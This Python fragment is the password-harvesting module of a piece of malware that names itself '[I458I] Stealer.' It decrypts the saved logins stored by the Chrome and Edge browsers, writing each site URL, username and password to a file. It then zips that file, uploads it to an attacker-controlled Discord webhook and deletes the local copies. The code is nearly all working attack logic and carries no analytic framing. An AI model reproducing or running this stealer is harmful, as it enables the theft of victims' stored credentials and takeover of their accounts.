def sdfgasad():
 try:
  ouyhabsndufyb = False
  class PasswordExtractor:
      def __init__(self):
          pass
      def get_chrome_datetime(self, chromedate):
          return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
      def get_encryption_key(self, browser):
          if browser == "Chrome":
              local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
              with open(local_state_path, 'r', encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              key = key[5:]
              return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
          elif browser == "Edge":
              local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
              with open(local_state_path, 'r', encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              key = key[5:]
              return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
          else:
              return None
      def decrypt_password(self, password, key):
          try:
              iv = password[3:15]
              password = password[15:]
              cipher = AES.new(key, AES.MODE_GCM, iv)
              return cipher.decrypt(password)[:-16].decode()
          except:
              try:
                  return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
              except:
                  return ""
      def extract_passwords(self, browser):
          key = self.get_encryption_key(browser)
          if key is None:
              return
          if browser == "Chrome":
              ouyhabsndufyb = False
              user_profile = os.path.expanduser("~")
              db_path = os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
          elif browser == "Edge":
              ouyhabsndufyb = True
              user_profile = os.path.expanduser("~")
              db_path = os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
          filename = "BrowserData.db"
          shutil.copyfile(db_path, filename)
          db = sqlite3.connect(filename)
          cursor = db.cursor()
          cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
          with open("passwords.txt", "a") as f:
              for row in cursor.fetchall():
                  origin_url, action_url, username, _, date_created, date_last_used = row
                  password = self.decrypt_password(row[3], key)
                  if username or password:
                      f.write(f'Origin URL: {origin_url}\n')
                      f.write(f'Action URL: {action_url}\n')
                      f.write(f'Username: {username}\n')
                      f.write(f'Password: {password}\n')
                  else:
                      continue
                  if date_created != 86400000000 and date_created:
                      f.write(f"Creation date: {str(self.get_chrome_datetime(date_created))}\n")
                  if date_last_used != 86400000000 and date_last_used:
                      f.write(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}\n")
                  f.write("=" * 50 + '\n')
          cursor.close()
          db.close()
          if ouyhabsndufyb == True:
           try:
               with open("passwords.txt", 'r') as check:
                   uhj = check.read()
                   if len(uhj.strip()) > 0:
                        try:
                            with zipfile.ZipFile('passwords.zip', 'w') as L:
                                L.write("passwords.txt")
                            with open("passwords.zip", "rb") as file:
                             data = {
                                "username": "[I458I] Stealer.",
                                "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
                                }
                             files = {
                             "file": ("passwords.zip", file, "application/zip")
                                }
                             requests.post(wbz, data=data, files=files)
                        except:
                         try:
                            os.remove("passwords.txt")
                            os.remove(filename)
                            os.remove("passwords.zip")
                            xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
                            ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
                            ys.add_embed_field(name="**No passwords fetched**", value="")
                            xs.add_embed(ys)
                            xs.execute()
                         except:pass
                   else:
                       os.remove("passwords.txt")
                       os.remove(filename)
                       os.remove("passwords.zip")
                       xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
                       ys = DiscordEmbed(title=":no_entry_sign: **No passwords found.**")
                       ys.add_embed_field(name="**No passwords fetched**", value="")
                       xs.add_embed(ys)
                       xs.execute()
               os.remove(filename)
               os.remove("passwords.txt")
               os.remove("passwords.zip")
           except:
             os.remove("passwords.txt")
             os.remove(filename)
             os.remove("passwords.zip")
             xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
             ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
             ys.add_embed_field(name="**No passwords fetched**", value="")
             xs.add_embed(ys)
             xs.execute()
  password_extractor = PasswordExtractor()
  password_extractor.extract_passwords("Chrome")  
  password_extractor.extract_passwords("Edge")
 except:
    xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
    ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
    ys.add_embed_field(name="**No passwords fetched**", value="")
    xs.add_embed(ys)
    xs.execute()